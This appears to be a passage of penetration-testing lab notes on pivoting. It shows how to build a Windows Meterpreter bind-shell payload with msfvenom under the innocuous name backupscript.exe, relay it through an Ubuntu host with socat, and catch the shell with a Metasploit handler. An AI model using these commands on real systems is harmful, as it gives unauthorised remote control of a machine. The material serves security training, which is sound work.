In the case of bind shells, the Windows server will start a listener and bind to a particular port. We can create a bind shell payload for Windows and execute it on the Windows host. At the same time, we can create a socat redirector on the Ubuntu server, which will listen for incoming connections from a Metasploit bind handler and forward that to a bind shell payload on a Windows target.
1. Creating the Windows Payload
```
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
```
2. Transfer backupscript.exe to Ubuntu Pivot Host
3. Transfer backupscript.exe to Windows Host on internal network from Ubuntu Host
4. Start a Metasploit bind handler. This bind handler can be configured to connect to our socat's listener on port 8080 (Ubuntu server)
```
use exploit/multi/handler
```
```
set payload windows/x64/bind_tcp
```
```
set RHOSTS <ubuntuIP>
```
```
set LPORT 8080
```
```
run
```
## Ubuntu Pivot Host
5. Starting Socat Bind Shell Listener
```
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```
6. Execute backupscript.exe on Windows Host
7. Bind Handler connect to Socat Listener
8. Meterpreter shell

